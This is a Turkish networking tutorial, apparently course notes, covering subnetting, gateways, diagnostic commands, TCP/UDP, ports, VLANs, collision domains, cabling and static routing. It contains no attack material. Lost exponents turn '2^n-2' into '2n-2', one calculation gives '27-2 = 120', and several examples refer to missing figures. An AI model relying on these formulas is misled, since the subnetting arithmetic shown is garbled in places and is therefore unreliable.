+				Örnek: Müdürünüz size 10.100.100.0/24 IP’sini aşağıdaki departmanlara uygun dağıtmanız gerektiğini söyledi. İlk departmanda 50host, ikincisinde 20host, üçüncüsünde ise 10host bulunması gerektiğini bildirmiş. Broadcast IP’lerini de bularak çözümünü yapalım.
+
+
+
+				Bir alt ağa 50 host verebilmek için 2n-2>= 50 olacak şekilde olmalıdır. Burada n=6 olması gerekmektedir. İlk networkümüz 64’lük bir parçadan oluşacaktır. n burada host bitimiz olduğu için ve IP C class olduğundan 8 tane 0'dan 6 tane 0 çıkarırsak network bitimiz yani 1’lerin sayısı 2 olacaktır. İlk networkümüzün subneti de /26 olacak. 
+
+				network 1 = 10.100.100.0/26
+
+				20 hostluk bir network için 2n-2 >= 20 burada n sayımız 5 olacaktır. İkinci networkümüz ise 32’lik bir parçadan oluşacaktır. Subnet ise 8-5'ten 3 tane network bitimizden oluşacak. Subnetimiz de /27 olacak. İlk network e 10.100.100.0/26 yani 64’lük bir parça verdiğimizden ikinci networkümüz 64’den başlayacak.
+
+				network2 = 10.100.100.64/27
+
+				10 hostluk bir network için 2n-2>= 10 burada n sayımız 4 olacaktır. 16’lık bir parça gerekmektedir. Subnet 8-4’ten 4 tane network bitimizden oluşacak. Subnet /28 . ikinci network 10.100.100.64/27 yani 32’lik bir parça verildiğinden üçüncü network
+
+				network3 = 10.100.100.96/28
+
+
+				Örnek: Sağ üst köşede bulunan networkleri uygun yerlere yerleştirelim.
+
+
+
+				RouterA’ya bağlı 7 host bulunacak. Burada küçük bir detay göze çarpıyor genelde, CCNA sınavlarında da bu şekilde şaşırtmaca sorabilirler. 2n-2 bizim host sayımızdı bu kuralı asla unutmayacağız yani 7 host görüp, 8’lik alt ağa bölersek yanlış yapmış oluruz. Çünkü tekrar hatırlatalım hatırlatalım “network IP’si ve broadcast İP’si kullanılamaz”.
+
+				Bu durumda routerA’ya bağlı alt ağımız 16‘lık parça olmak zorunda. n = 4 olduğundan en az 4 tane “0” yani host bitimiz olacak bu durumda hali hazırda /24 olan network için /28’lik bir para ayıracağız.
+
+				RouterB’ye bağlı 90 host için 128’lik bir parça ayırmamız gerekiyor. 27-2 = 120 n=7 olduğundan 7 tane “0” yani host bitimiz olacak. /24 networkümüz için ayıracağımız parça /25 olacak bu durumda.
+
+				RouterC’ye bağlı 23 host için en küçük 32’lik bir parça gerekiyor. 27-2 = 30 n=5 olduğundan 5 tane “0” yani host bitimiz olacak. /24 networkümüz için ayıracağımız parça /27 olacak bu durumda. Bu örnek üzerinden anlatacağımız yeni konuya gireceğiz, gateway kavramını anlatacağız.
+
+
+
+
+
+3- Gateaway :
+
+		Network uygulamalarında farklı şekillerde kullanılan ve kapalı bir alandan dışarıya örneğin internete çıkma olanağı sunan cihazlardır. Bir başka kullanım şekli farklı protokoller kullanan ağların birbirlerine bağlanmasını sağlamaktır. 
+
+		Internet ya da başka bir networke bağlanmak için kullanıldığında bilgisayarların TCP/IP konfigürasyonunda Gateway olarak tasarlanan cihazın ip adresi tanımlanmalıdır. Bu şekilde kullanımı yönlendiriciler (Router gibi) vasıtasıyla yapılmaktadır.
+
+		Önceki konularda anlattığımız bir client kendi networkünde olan bir başka client ile haberleşeceği zaman ARP sorgusu yapıp MAC adresini öğrendikten sonra haberleşiyordu. Farklı bir networkle haberleşeceği zaman ise istekler gateway denen IP’ye doğru yönlenir. 
+		Farklı networkten kastımız ise kendi networkü dışındaki bütün networkler. Bu gateway’e örnek evinizdeki modemleri verebilirsiniz. 
+		İnternet sizin bilgisayarınızın bilmediği bir network ve internete yaptığınız her istek modem’e çıkacaktır. Genelde gateway'lere networklerin kullanılacak ilk IP adresini verirler, ama kullanılır IP aralığından istediğinizi de kullanabilirsiniz. 
+
+		Örneğimizde bizden gateway IP adreslerini istemiş, Router A için /28 olacağını söylemiştik. Yani gateway 192.168.55.29/28 olacak. Router B için /25 olacağını bulmuştuk. Yani gateway 192.168.55.132/25 verebiliriz. Router C için /27 olacağını bulmuştuk 192.168.55.57/27 verebiliriz.  
+		Ve son olarak RouterA'nın RouterB ile bağlı olan networkünü inceleyelim. RouterA tarafına 192.168.55.2/30 verilmiş. 30 maskımız demek IP adresimiz toplam 32 bit olduğundan geriye 2 tane host bitimiz kaldığını belirtiyor. 22-2 = 2 olmaktadır. 
+		Yani iki cihaz birbirine bağlanacağı zaman verebileceğimiz en küçük network /30 olmaktadır. 4’lük bir parça olsa bile 1 network 1 broadcast IP adresi kullanmayacağımız için geriye 2 tane kalıyor. Sağ üst köşede 2 tane verilmiş biri 192.168.55.0/30 ve 192.168.55.1/30 kuralımızı bildiğimizden “network IP si kullanılamaz” bu durumda 192.168.55.0/30 un kullanılamayacağını biliyoruz. 
+		RouterB’nin bacak IP'si bu durumda 192.168.55.1/30 olacaktır.
+
+
+4- Network Control :
+
+	ping
+	Ağda oluşan IP ile ilgili sorunları çözmenin en kolay yollarından biri PING komutudur. 1983 yılında Mike Muuss tarafından yazılmış bir programdır. Ping, ağ üzerinde bulunan bilgisayarların ulaşılabilirliğini test etmek için ICMP (Internet Control Message Protocol) protokolünü kullanan bir uygulamadır. İki bilgisayar arası ulaşılabilirlik şu şekilde tanımlanabilir. 
+	Eğer A bilgisayarından gönderilen paketler B bilgisayarı tarafından alınıp işlenebiliyor ise; B bilgisayarı, A bilgisayarından ulaşılabiliyor demektir. Ping komutu bir bilgisayara 32 byte’lık bir ICMP paketi gönderir ve sonuçta elde ettiği raporu gösterir. Ping (echo) paketi gönderilen makinenin o anda çalışmakta olduğunu teyit eder. 
+	Ağın o anki paket kayıp oranı hakkında bir bilgi verebilir. Kaynak makine ile karşı makine arasındaki iletişimin süresini gösterir.
+
+
+
+	TTL(time to live) değeri IP packetinde bulunan bir değerdir. Hedefe ulaşana kadar geçtiğiniz networklerde 1 düşer. 0 olunca hangi network cihazına geldiyse o cihaz bu paketi drop eder.
+ 
+
+	tracert
+	Bu sayede, bilgisayarınızdan bir başka hedef noktaya ulaşırken, paketlerimizin hangi yolları takip ettiği kontrol edilir. 
+	Bu komut ile hedef bilgisayar ve sizin aranızdaki en yakın ve en kısa yolu belirleyen routerların bir listesi gösterilmiş olur.
+
+
+
+ 
+
+	arp -a
+	IP adresini bildiğimiz bilgisayarın MAC adresini öğrendikten sonra onla haberleşebildik bunu öğrenmiştik. 
+	Peki, o bilgisayara tekrar bilgi göndermek istesek ne olacak? Tekrar bir ARP broadcast mesajı mı yayınlanacak? Hayır, çünkü ARP üzerinden elde edilen bilgiler arp tablosunda saklanır ve bir MAC adresi gerekli olduğu zaman, ilk önce buraya bakılır. 
+	Eğer IP adresine karşılık gelen MAC adresi bulunuyorsa, broadcast yapmadan bu adres kullanılarak iletişime geçilebilir.
+
+
+
+ 
+
+	Nslookup
+​	Nslookup bilgisayara yüklü TCP/IP protokolü ile birlikte gelen bir araçtır. Domain adları ve ip adresleri ile ilgili çeşitli sorgular yapmanıza yardımcı olur. 
+	Windows’ta komut satırı üzerinden çalıştırılan bu araç bazı web sitelerinden online olarak da kullanılabilmektedir. Nslookup komutunu kullanarak bir web sitesi veya server'ın çeşitli network durumlarını sorgulayabilirsiniz.
+
+
+
+5- TCP/UDP :
+
+	Şimdiye kadar TCP/IP katmanlarından ilk 3 katmanda çalıştık. Bundan sonra verinin nasıl gideceğine bakacağız. Transport katmanını kontrol edeceğiz. Kullanıcı uygulamalarının IP katmanına doğrudan ulaşımları yoktur. 
+	IP ve uygulama programları arasındaki bağlantıyı sağlayan iki protokol vardır: Transmission Control Protocol (TCP)’ ve ‘User Datagram Protocol (UDP)
+
+	* TCP: Bağlantı temelli bir protokol olan TCP’de kullanıcı verisi taşınmadan önce bağlantı kurulması gerekir. Protokol, ulaşım katmanında uçtan-uca güvenilir bir ortam yaratmayı amaçlar. Ortamın güvenilirliği, kaybolan paketlerin tekrar gönderilmesini temel alır. 
+	IP katmanında verilerin güvenli bir şekilde taşınacağı garantilenmez, bu işi TCP yapar. 
+	TCP gelen veriyi 64KB olarak parçalayarak sıralı gönderilmesini sağlar. Bu sebeple her bir veri karşı tarafa ulaştığında ulaştığına dair geri dönüş verir bu sayede iletim anında kaybolan veri tekrar yollanır.
+
+	TCP veri taşınmadan önce bağlantı kurulması gerekiyor demiştik. Belki karşılaştığınız bir kavram olan “3 way handshake” olayından bahsedeceğiz. TCP katmanında haberleşmeden önce iki cihaz arasında bir el sıkışma yapılır.
+	Client bir serverla konuşacağı zaman ilk paket olarak bir sayı ile SYN isteği gönderir, bu sayıya sequence number denir. Server bu SYN isteğini aldığı zaman yeni bir sequence numarası üretir ve gelen sequence numarasını 1 artırarak ACK numarası üretir. Client tarafına SYN-ACK paketi gönderir. 
+	Client bu SYN-ACK numarasını alıp server’a bir tane ACK packeti yollar seq ve ack numaraları bir artar böylece paketlerin kendilerinden gittiğini anlarlar bu artırılmalardan. Bu 3 işlem gerçekleştiği anda TCP bağlantı kurulur ve haberleşme hazır hale gelir.
+
+ 
+
+	Bu el sıkışmadan sonra client her yolladığı veri karşılığında server'dan bir reply almayı bekler. Eğer ilgili reply dönmezse aynı veriyi birkaç defa göndermeye devam eder, belli bir süre sonra göndermeyi bırakır.
+
+	* UDP: TCP’yi düşünürsek verinin parçalara bölünmesi ve her parçanın yollanması sonrası karşıya ulaştığının dönüşünün beklenmesi ne kadar güvenli olsa da yavaş çalışan bir protokol olduğunu düşündürüyor. 
+	Bu durumda uygulama katmanında geliştiriciler güvenlik yerin verimliliği tercih ettiği zamanlar da olmaktadır. Burada devreye UDP girmektedir. UDP paketlerini taşımadan önce TCP de olduğu gibi bir üçlü el sıkışma gerekmez. 
+	UDP basit bir protokoldür; kaybolan verinin tekrar gönderilmesi, akış kontrolü gibi konularla ilgilenmez. Bu yüzden hızlı bir protokoldür. Basitliği nedeniyle de gerçek zamanlı uygulamalarda tercih edilir
+
+
+
+6- Port Numaraları : 
+
+	DNS konusunda 53 portundan bahsetmiştik şimdi bunu detaylandıralım. Günümüz dünyasında birçok işletim sistemi birden fazla programın aynı anda çalışmasına izin vermektedir. 
+	Bu programlardan bazıları dışarıdan gelen istekleri (istemci-client/request) kabul etmekte ve uygun gördüklerine cevap (sunucu-server/response) vermektedir (TCP). Sunucuların birbiri arasında bu haberleşmesini IP adresleri üzerinden yaptığını söylemiştik. 
+	Peki sunucular eriştiği hedefteki hangi programdan hizmet alacağını nasıl belirler? Bu sorunun cevabı da port numaralarıdır.
+
+	Bazı sunucu programları, daha önce herkes tarafından bilinen 'port' lardan hizmet verirken bazıları da sunucu programını çalıştıran kişinin türüne ve isteğine göre değişik 'port' lardan hizmet verir. 
+	Dolayısıyla, ağ üzerindeki herhangi bir sunucu programa bağlanmak istenildiğinde, programın çalıştığı bilgisayarın adresinin yanında istekleri kabul ettiği 'port' numarasını da vermek gerekir.
+
+	Herkes tarafında kabul görmüş sabit port numaraları olan well-know portlar 1024 ve altındakilerdir, 1024 üstündeki portlar genelde TCP connection’ı başlatan client tarafında kaynak port olarak kullanılmaktadır. Toplam port sayımız 65535’tir.
+
+	En çok bilinen port numaları aşağıdaki gibidir,
+
+
+	Mesela bilgisayarınızdan browser’a bir internet sitesi çağırdığınızda önce 53 portundan o sitenin IP’sini buluyor, daha sonrada HTTP veya HTTPS üzerinden siteye ulaşılıyor. Mailleri çalıştırırken 25 portunu kullanıyoruz.
+
+	Buradan yola çıkarak gideceğiniz hedefte hangi hizmet veriliyor onun aktif olup olmadığını bu port numaralarını kullanarak anlayabiliyoruz. Telnet ile portların açık veya kapalı olduğunu öğrenebiliriz.
+
+	*port kontrol: Sunucunuzda hizmet verdiğiniz bir servisin dışarıyla iletişim kurup kuramayacağını da verdiğiniz servisin port numarasını test ederek öğrenebiliriz, bunu da local host ile yapıyoruz. IP adresleri türlerinde öğrendiğimiz 127.0.0.1 IP adresini kullanacağız. 
+	Sunucunuzda web servisi hizmeti veriyorsanız bunu command promt üzerinde “telnet 127.0.0.1 80” şeklinde bir komut çalıştırırsak, kendi sunucumuzdaki 80 portun açık olup olmadığına bakabiliriz.
+
+	*netstat -an: netstat -an komutu ile sunucudan dışarıya eriştiğimizde kullanılan source portlarını da görmüş oluruz. Mesela aşağıda 95.168.168.213 IP’sinin 80 portuna yani web sitesine erişim sağlanmış. Dikkat edersek 80 portuna giderken aynı zamanda 59 binli random porttan erişim sağlanıyor.
+
+
+
+
+
+
+
+7- VLAN : Haberleşme temellerinde broadcast’in ne kadar önemli olduğundan bahsetmiştik. Bir client diğer bir client’a erişirken broadcast yayıp MAC adresini öğreniyordu. Broadcast, network içinde ulaşabildiği bütün uçlara ulaşıyordu. 
+	Tabii biz bu broadcast’in ulaşacağı yerleri sınırlarsak ya da bir cihazdan çıkan bir broadcast diğer cihaza hiç ulaşmazsa bu durumda MAC adresini öğrenemeyeceği için haberleşme gerçekleşmeyecektir. İşte VLAN’ı (Virtual Local Area Network) tanımlayabileceğimiz en basit ifade bu şekilde olur.
+
+	VLAN’lar bir network içinde oluşturulmuş adından da anlaşıldığı gibi sanal networklerdir. Her VLAN kendi broadcast domaini oluşturur. Yani oluşturduğumu bir VLAN içindeki bir client üstünden başlayan broadcast trafik diğer VLAN’a geçmez. 
+	Bu her ne kadar broadcast trafiğin yönetmemizi sağlasa da dolaylı yoldan ayrı VLAN’lardaki clientları haberleştirmediğinden güvenli bir network yaratmamızı sağlayacaktır. Mesela şirketinizde bir misafir ağı yaratmak istiyorsunuz ve misafir ağına bağlanan kullanıcıların sizin sisteminize, sunucularınıza erişmesini istemiyorsunuz. 
+	Burada misafir ağı için ayrı bir VLAN kullanırsanız sizin networkünüze erişemeyecek, böylece izole etmiş olacaksınız.
+
+	VLAN 2.katmanda çalışmaktadır ve en basit olarak switchlerde oluşturulur. Maximum 4096 adet oluşturulabilir.
+
+	*Data Vlan: Standart trafiği taşımak için yapılmıştır.
+	*Default Vlan: Varsayılan vlan yapılandırmasıdır. Genel “Vlan 1” olarak bulunur. Switchin bütün portları default vlan olarak gelir. Herhangi bir konfigürasyon yapılmazsa bu switchin portlarına takılan cihazlar birbirleri ile haberleşir.
+	*Voice Vlan: Üzerinden ses trafiği geçmesi için kullanılır, ses iletimi için IP telefonlar kullanılır.
+	*Native Vlan: Bu VLAN türü herhangi bir VLAN etiketine sahip olmayan çerçevelerin trunk portlardan taşınmasını sağlar. Özel olarak bir VLAN’a atanmamış paketler native VLAN’a yönlendirilir. Native VLAN varsayılan olarak VLAN 1’dir.
+
+	Switch üzerinde VLAN’lar yaratıldıktan sonra kullanılacak cihaz için belli portlara atanır, birkaç faklı port türü vardır.
+
+	*Access Port: Bir Access portu sadece bir VLAN’a atanabilir ve o VLAN ile ilgili bilgileri sadece o porta iletir. Son clientlar VLAN bilgilerini anlamazlar, yani switchler Access porta gönderilecek framelerden VLAN bilgilerini çıkartır.
+
+	*Trunk Port: Trunk port ile aynı anda, farklı VLAN’ların tamamını tek bir portun parçası yapabilirsiniz. Bu trunk port, switch-switch veya router-switch arasında kullanılır. Trunk porttan iletilen veri de VLAN bilgisi bulunur. 
+	Bu sebeple bir bilgisayar gibi bir cihaz bu VLAN bilgisini anlamayacağı için trunk portlara son cihaz takılmaz. Son cihazlar paketler etiketsiz gönderilir. Switchler arasında olan trunk portlar var olan bütün VLAN bilgilerini aktarır.
+	
+	Aşağıdaki şekilde SW1’e bağlı bir client SW3’teki client’a erişmeye çalışırken, öncelikle bir broadcast istek olan ARP isteği gönderecek ve fiziksel adresini öğrenmek isteyecek. Fa0/1’den giren broadcast switche geldiğinde switch tarafından yine aynı vlana atanmış portlara ve trunk portlara gönderilecek. 
+	Normalde bütün portları default vlan olan switchte bu broadcast bütün portlara gönderilir. Trunk porta gönderilirken bir sonraki switch'in bu gönderilen paketin VLAN 10’dan geldiğini anlaması için gönderen switch tarafından etiketleme işlemi yapılarak gönderilir ve bu paketler “Tagged frame” olarak adlandırılır. 
+	Bu tagged frameler sadece router ve switchler tarafından açılıp işlenir. SW2 den geçip trunk porta iletilen paket SW3 e geldiğinde, SW3 frame deki VLAN 10 tag’ini görüp bu paketi açar ve VLAN10 portunun bulunduğu FA0/2 ye gönderir. Gönderilen pakette herhangi bir etiket bulunmaz, bu paketlere de “Untagged Frame” denir.
+
+
+
+	Trunk olarak ayarlanan bir port, switch üzerinde bulunan bütün VLAN broadcastlerini geçirecek şekilde davranır. Yukarıdaki topology’i ele alırsak, mesela SW1’deki VLAN20 cihaz bir broadcast yayın yaptığı zaman bu broadcast trunk portlardan SW3 e kadar gidecek. 
+	Fakat topology’i gözden geçirirsek SW3 de VLAN20 broadcast in gelmesinin gerek olmadığını görüyoruz çünkü karşılayan herhangi bir uç cihaz bulunmuyor. Bu yüzde bu SW3 için fazladan bir broadcast trafiği meydana geliyor. Bunu engellemek için biz TRUNK portlara sadece istediğimiz VLAN bilgilerini geçir diyebiliyoruz. 
+	SW2’nin Gi0/0 portuna sadece VLAN10 ve VLAN30 bilgilerini geçir dediğimiz anda VLAN20’den başlayan herhangi bir broadcast SW3’e gelmeyecektir.
+
+	Untagged frame ile Tagged Frame, switchin anlayacağı VLAN bilgisi TAG olarak frame’e eklenir.
+
+
+
+	*Voice Port: Bir Access portunun sadece bir VLAN’a atanabileceğini söyledik. Bugünlerde, birçok switch, bir switch porttaki Access portuna, ses trafiğiniz için ikinci bir VLAN daha eklemenize izin vermektedir. O, voice VLAN’ı olarak belirtilmektedir. Bu teknik olarak farklı bir link tipi olarak kabul edilse de hala hem veri hem de ses VLAN’ı için yapılandırılabilen bir Access linkidir. Tek switch portuna hem PC hem de telefon bağlamanıza izin verir. Burada verinin ayrımı Trunk portta gördüğümüz tagged ve untagged olayıdır. Bir switch’in portuna Access VLAN 15, ve Voice VLAN 5 dediğimiz anda switch voice ile ilgili paketleri etiketleyecek DATA ile ilgili paketleri etiketlemeyecektir. IP telefonda sadece etiketli paketleri açacağından diğer etiketsizler bilgisayara gidecektir.
+
+
+
+	Collision Domain: L3 ve L2 katmanlardaki network teknolojilerini inceledik, L1 katmanı yani fiziksel katmandaki ufak bir detaydan bahsedeceğiz. VLAN ve haberleşme için broadcast domainden bahsetmiştik, broadcast domainden daha basit bir haberleşme şekli olan L1 katmanındaki haberleşmeden bahsedelim. 
+	HUB’ların L1 katmanında çalıştığını TCP/IP katmanlarında belirtmiştik. Peki bu HUB’lar nedir? HUB portlarına cihaz bağlı bir haberleştirme cihazıdır. HUB’a bağlı bir cihazdan bir veri gönderilirse bu veri diğer tüm portları gidecektir ve diğer cihazlar da bu veriyi alacaktır. 
+	Yani HUB’a bağlı tüm cihazlar aynı yolu kullanırlar ve bu da aynı anda haberleşmek isteyen network cihazlarının, bir tek yol olduğu için hattın boşalmasını beklemelerine sebep olur. Eğer boşalmadan aynı anda veri yollamaya kalkarlarsa collision dediğimiz, çarpışma yaşanır ve verinin tekrar gönderilmesi gerekmektedir. 
+	Bu yüzden her cihaz aynı yolu kullandığından HUB’lar tek bir collision domain oluştururlar.
+
+	Switchlerin HUB’lardan en büyük farklarından biri switch’in her bir portu ayrı collision domain oluşturur. Veriler anahtarlanarak gönderilir. İki cihaz haberleşirken başka bir cihaz farklı bir cihazla haberleşebilir ve collision yaşanmaz. Özet olarak söylersek,
+
+
+	HUB – 1 collision domain, 1 broadcast domain
+	SWITCH – (x portuna cihaz bağlıysa) x collision domain, 1 broadcast domain (her portu default VLAN ise)
+	ROUTER – her portu 1 broadcast domain oluşturur.
+
+	bir örnekle inceleyelim;
+
+
+
+	HUB’in her portuna bağlı cihazlar 1 collision domain oluşturuyor demiştik, switchin her bir portu da 1 coliision domain demiştik yani burada 6 tane collision domain var, router’ın her portu bir broadast domain oluşturacağından burada 5 tane broadcast domain vardır.
+
+	Bridge: Bridgeleri, 2 portlu switch olarak düşünebilirsiniz. Bridge tek anahtarlamalı sistem olarak çalışır. Hublardan daha spesifiktir.
+
+
+
+	Comp1 Comp2 ile haberleşeceği zaman aynı anda Com5 ve Comp6 da aralarında haberleşir. İki ayrı collision domain olur bu sayede. Ne zaman comp1 comp5 ile haberleşme ihtiyacı duyar o zaman anahtarlama sayesinde paket diğer porta gider. Üstüne tanımlanan MAC adresleri sayesinde iki ağı birbirinden ayırarak haberleştirir.
+
+	Bir örnekle inceleyelim,
+
+
+
+	Hublar’ın bütün portları tek collision domainken bridge 2 portu da ayrı collision domain oluşturur demiştik, switchin bütün portları ayrı collision domain bu yüzden 5 tane collision domain mevcuttur.
+
+	Yine gördüğümüz bütün network cihazları ile bir örnek inceleyelim,
+
+
+
+	Gördüğünüz gibi kuralları net belirlediğiniz sürece collision domain sayısını bulmak zor olmuyor.
+
+
+
+
+
+8- Fiziksel Bağlantı :
+
+	Network cihazlarının birbirleri ile protokol bazında konuştuklarından bahsettik şimdi de bu cihazların bağlanmasındaki fiziksel kısmı anlayacağız. 
+	Ağa bağlanan cihazlar Ethernet teknolojisini kullandığını belirtmiştik bu bağlantıları da belli bir kablo düzeneği ile yaparlar. Bu kablolara RJ-45 denir.
+
+	Normalde kablo sıramız straight düzendir. Turuncu-beyaz, turuncu, yeşil-beyaz, mavi, mavi-beyaz, yeşil, kahverengi-beyaz, kahverengi. Dünyada bütün son bağlantılar bu sıralamayla yapılmaktadır.
+
+
+
+	Bu kabloların renk sıralamasına göre bağlantı çeşitliliği yapılır. Günümüzde bu şekilde bir ihtiyaç bulunmamaktadır ama eskiden iki bilgisayarı birbirine direk rj-45’leri takarak konuşturamıyordunuz.
+	 Kabloyu cross yaparak konuşturabiliyorduk. Aynı durum network cihazlar içinde geçerli. Aşağıda belirli network cihazları için bağlantı çeşitleri verilmiştir.
+
+
+
+	Rollover kablo network cihazlarına bağlanmak için kullanılan console kablosunda kullanılır.
+
+	Basit bir yöntem olarak aynı mantıkta çalışan cihazlar birbirine cross (router-PC hariç), farklı mantıkta çalışan cihazlar birbirine straight bağlanır.
+
+
+9- Router :
+
+	Farklı VLAN ve farklı networklerin birbirleri ile haberleşemeyeceğini belirtmiştik. Peki haberleşme ihtiyacı duyulduğunda nasıl ilerleyeceğiz? Burada devreye routing giriyor. Yönlendirme dediğimiz bu işlemi yönlendiriciler (ROUTER) vasıtasıyla yaparız. Routerlar kendilerine ait bir routing tablosu tutarlar. Routing tablosunda hangi networke hangi yoldan gideceği bilgisi bulunur. Bu sayede farklı networkleri birbirleri arasında haberleştirir.
+
+	Daha önce de bahsetmiştik; bir client bilmediği bir host’a gitmek isterken gateway’e yönleniyordu, yani kendi network’ü dışındaki bütün networkler demek oluyor bu. Bu durumda bir network’ün eğer gateway’i router olursa bilmediği bir network’e gitmek için router’a çıkacak, router da gideceği networkü biliyorsa gideceği yere yönlendirecek böylece routing işlemi sağlanmış olacak. Clientların çıktığı bu gateway’e default gateway denir. Evinizdeki modemler buna bir örnektir. İnternete gideceğiniz zaman bütün paketleriniz ilk önce modem’e gidip oradan internete gidecektir.
+
+
+
+	Yukarıdaki adımda Host A, Host B’ye sadece ping atmak istemektedir. Burada neler yaşandığını adım adım inceleyelim.
+
+	1- Internet Control Message Protocol (ICMP), bir echo request oluşturur.
+
+	2- ICMP, bu request’i Internet Protokolüne (IP) gönderir, böylece bir paket oluşturulur. Bir paket, en az bir IP kaynak adresi ve IP hedef adresi içerir.
+
+	3- Paket oluşturulunca, IP hedef adresinin lokalde mi yoksa uzak network’te mi olduğunu belirler. Kendi networkünde mi, değil mi?
+
+	4- IP, bunun uzak bir istek olduğunu belirleyince, paketin uzak ağa route edilebilmesi için varsayılan ağ geçidine yani bilinmeyen adreslerin yönlendirildiği default gateway’e gönderir.
+
+	5- Host A üzerinde default gateway 192.168.5.1 olarak ayarlanmış. Bu durumda öncelikle Fa0/0’a ulaşması gerekiyor. Bu paketin yani LAN içerisinde iletişim gerekiyor bunun için de FA0/0 in MAC adresine ulaşması gerekiyor. (192.168.5.1’e ulaşması için.) Host A bir broadcast başlatır ve MAC adresi öğrenmek ister.
+
+	6- ARP broadcast den sonra Fa0/0’ın donanım adresi öğrenilir ve paketler 192.168.5.1’in MAC adresine doğru iletilir. Layer 2 katmanında olacağı için bu iletim Frameler şeklindedir.
+
+	7- Router’a ulaşan bir frameler, IP katmanına yollanır.
+
+	8- IP katmanı bu paketi alıp hedef IP adresini kontrol eder, eşleşen bir bilgi olup olmadığını kontrol etmek için routing tablosuna bakar.
+
+	9- Eğer routing tablosunda hedef IP adresine ait bir veri yoksa paket atılacak(discard) ve ping yollayan makineye yani Host A’ya network erişilemez mesajını dönecektir.
+
+	10- Şayet router, routing tablosunda hedef IP adresi için kayıt bulursa, hedef IP adresin bağlı olduğu FA0/1’e gönderir.
+
+	11- Router Fa0/1 den paketi 10.0.0.5’e yollayacağını bilir fakat haberleşme tekrar LAN içerisinde olacağı için öncelikle yine donanım yani MAC adresini öğrenmesi gerekir, bu yüzden FA0/1 den bir ARP sorgusu 10.0.0.5 in MAC adresini öğrenmek için gönderilir.
+
+	12- MAC adresi cevabı FA0/1 e döndükten sonra paket HostB’nin MAC adresine iletilir.
+
+	13- ICMP isteği Host B’ye geldikten sonra, Host B bu echo requeste cevap olarak echo reply oluşturur ve geri Host A’ya göndermek için işlem başlatır.
+
+	14- Aynı döngüler bu sefer Host B tarafından Host A’ya doğru işlenerek, Host A’ya ulaşır ve Host A bütün bu işlemlerin sonunda tek bir ! işareti görür ve aynı icmp'den 4 tane daha yollar.
+
+
+
+
+
+	Routerlar 3 farklı şekilde routing tablosu oluştururlar;
+
+	Directly connected interfaceler: Önceki örneğimizde gördüğümüz gibi bir router üzerindeki interfaceler’de bulunan IP networklerini birbirleri ile haberleştiriyordu bunun sebebi bir router’da bir interface aktif ederek IP verildiğinde, router bu verilen IP’nin network olarak route tablosuna ekler. Örnekten yola çıkarsak.
+
+	C              192.168.5.0/24       is             directly    connected,              FastEthernet0/0
+	C              10.0.0.0/8               is             directly    connected,              FastEthernet0/1
+
+	Route tablosunda connected şekilde bu networkler görünecektir.
+
+	Static route: Yaptığımız örneklerde 1 adet router’a bağlı LAN netwokleri arasında haberleşmeyi inceledik. Peki router sayısı artığında nasıl bir yol izleyeceğiz?
+
+	Routerlar kendi üzerindeki interfaceleri routing tablosun ekliyordu. Kendi bilmediği network’e gitmek için de static route ekleyerek kendinde olmadığını fakat erişebilmesi için şuraya gitmesi gerektiğini belirtmiş olur.
+
+	R1 192.168.1.0/24 ve 192.168.12.0/24
+	R2 192.168.2.0/24 ve 192.168.12.0/24E’e nasıl erişeceklerini bilmekteler.
+
+	Fark ettiyseniz burada R1 ve R2’nin ortak bir network’e sahip olduğunu göreceksiniz. Yani R1 ve R2, 192.168.12.0 networkü üzerinden birbirlerine erişebilirler. Routerlar farklı networkleri IP katmanında haberleştireceği için kendileri haberleştiği zaman üzerindeki networkleri de haberleştirebilirler.
+
+
+
+	H1’in H2’ye ulaşırken öncelikle bilmediği bir network olduğundan paketi direk default gateway’ine atacak yani R1’e. R1 192.168.2.0/24 networkünü bilmediğinden normalde packeti discard edecektir.
+	 Fakat biz ona öğretirsek bu network için packetleri nereye atması gerektiğini görevi gereği yönlendirecektir. R1’e 192.168.2.0/24 gitmesi için R2’ye gitmesini söyleyeceğiz. 
+	Burada packetleri göndereceğimiz nokta R1’e en uzak, R2’ye en yakın yerdir, burası da 192.168.12.2 IP’sine sahip gi0/2 interface’idir. Aynı şekilde R2 router’ına da 192.168.1.0/24 networküne olan istekler için 192.168.12.1’e göndermesini belirteceğiz böylece giden paket aynı zamanda geri dönebilsin.
+
+	Static route yapılırken hedef adresin network bilgisi yani hem IP hem de subnet mask bilgisi, gönderileceği IP bilgisi yani;
+
+	192.168.2.0            255.255.255.0                        192.168.12.2          şeklinde route yazılmaktadır.
+	(hedef network)     (hedef network mask)           (yönlendirileceği IP)
+
+
+
+	Router sayımızı 3’e çıkarırsak nasıl bir işlem yapacağımızı görelim.
+	
+	172.16.1.0 networkünden 172.16.2.0 networküne erişeceğiz. İki router da birbirine bağlı networklerle ilgilenmiştik. Burada arada farklı bir geçiş router’ı mevcut. Routing yaparken yaptığınız router en uzak ulaşacağınız networke en yakın yere route edeceğinizi söylemiştik.
+
+	R1 için route yazarsak,
+	172.16.2.0 255.255.255.0 192.168.12.2 paketleri R2’ye atmış olduk.
+
+	R2 için route yazarsak,
+	172.16.2.0 255.255.255.0 192.168.23.3 R2’ye de networkün R3’te olduğunu öğrettik.
+
+	Bu durumda haberleşme sağlanmayacaktır çünkü haberleşme kuralımızda bir packet gönderiliyorsa geri gelmesi gerekiyor. Mesela herhangi bir işlem yapmazsa paket R1 in Fa0/0’indan çıkacak hedef adresini takip ederek R3’ün Fa0/0’ına gelecek. 
+	172.16.2.0’a ulaşacak daha sonra, 172.16.2.0’daki cihaz 172.16.1.0 networkünü bilmediğinden default gateway’ine atacak. R3 bu paketi alacak ve geri dönmesi gereken IP’ye baktığında 172.16.1.0 networkünü tanımadığını görecek ve paketi discard edecek.
+	 Gördüğünüz gibi bir haberleşme tam olabilmesi için her router’a mevcut networkleri öğretmemiz gerekecek. Şimdi geri dönüş için routeları yazalım.
+
+	R3 için route yazarsak;
+	172.16.1.0 255.255.255.0 192.168.23.2 paketleri R2’ye göndereceğiz
+
+	R22’de ise;
+	172.16.1.0 255.255.255.0 192.168.12.1 şeklinde routeları yazarak haberleşmeyi sağlamış olduk. Fark ettiyseniz R2’nin diğer iki LAN networkleri ile bir ilgisi yok ama üzerinden geçen paketleri yönlendirebilmesi için bu bilgiyi ona verdik.
+
+	Default route: PC’lerde olan default gateway kavramına benzemektedir. PC’ler bilmediği networkleri default gateway’e atardı yani kendinden başka networkler. Routerlar’da da bu default route yazılarak yapılır. 
+	Bir router da bir adrese doğru default route yazarsanız, routing tablosunda görmediği networkler için diğer bütün paketleri oraya yönlendirecektir.
+
